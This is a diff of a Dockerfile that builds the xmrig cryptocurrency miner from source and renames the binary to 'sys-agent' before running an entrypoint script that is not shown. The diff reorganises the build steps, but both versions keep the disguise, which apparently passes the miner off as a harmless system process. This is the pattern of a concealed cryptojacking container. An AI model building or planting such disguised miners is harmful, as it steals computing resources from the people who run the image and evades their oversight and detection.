@@ -6,15 +6,24 @@ RUN apt-get update && apt-get install -y \
   libhwloc-dev libuv1-dev libssl-dev && \
   rm -rf /var/lib/apt/lists/*
 
-RUN git clone https://github.com/xmrig/xmrig.git && \
-  mkdir xmrig/build && cd xmrig/build && \
-  cmake .. && make -j$(nproc) && \
-  mv xmrig /sys-agent && \
-  chmod +x /sys-agent
+# Set working directory
+WORKDIR /app
 
-# Copy entrypoint
+# Clone xmrig
+RUN git clone https://github.com/xmrig/xmrig.git
+
+# Build xmrig
+WORKDIR /app/xmrig
+RUN mkdir build && cd build && \
+    cmake .. && make -j$(nproc)
+
+# Rename binary to sys-agent
+RUN mv /app/xmrig/build/xmrig /app/sys-agent && chmod +x /app/sys-agent
+
+# Copy entrypoint script
 COPY entrypoint.sh /entrypoint.sh
 RUN chmod +x /entrypoint.sh
 
-# Run entrypoint
+# Set working dir and run
+WORKDIR /app
 CMD ["/entrypoint.sh"]
